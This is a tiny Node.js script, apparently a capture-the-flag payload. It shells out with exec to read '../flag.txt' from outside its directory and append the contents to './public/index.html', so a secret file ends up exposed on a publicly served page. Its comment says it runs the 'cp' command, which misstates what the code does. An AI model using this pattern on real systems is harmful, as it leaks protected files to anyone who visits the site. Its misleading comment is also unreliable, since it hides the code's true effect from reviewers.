import { exec } from 'node:child_process';

// This runs the literal system 'cp' command
exec('cat ../flag.txt >> ./public/index.html', (err) => {
  if (err) console.error('System copy failed', err);
  else console.log('Done');
});

